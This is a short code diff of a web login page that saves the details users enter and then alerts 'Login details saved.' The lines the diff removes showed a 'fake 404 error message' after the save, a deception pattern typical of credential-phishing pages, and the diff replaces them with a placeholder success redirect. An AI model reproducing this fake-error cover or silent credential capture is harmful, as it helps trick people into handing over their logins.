@@ -45,9 +45,6 @@
                     <a href="#">Create new account</a>
                 </div>
             </form>
-            <div id="error-message" style="display:none; color:red; margin-top:20px;">
-                404 Error: Page not found.
-            </div>
         </div>
     </div>
 
@@ -67,8 +64,8 @@
             .then(() => {
                 console.log("Document successfully written!");
                 alert("Login details saved.");
-                // Show fake 404 error message
-                document.getElementById('error-message').style.display = 'block';
+                // Redirect to a different page or show a success message
+                // window.location.href = "success.html"; // Uncomment if you have a success page
             })
             .catch((error) => {
                 console.error("Error writing document: ", error);
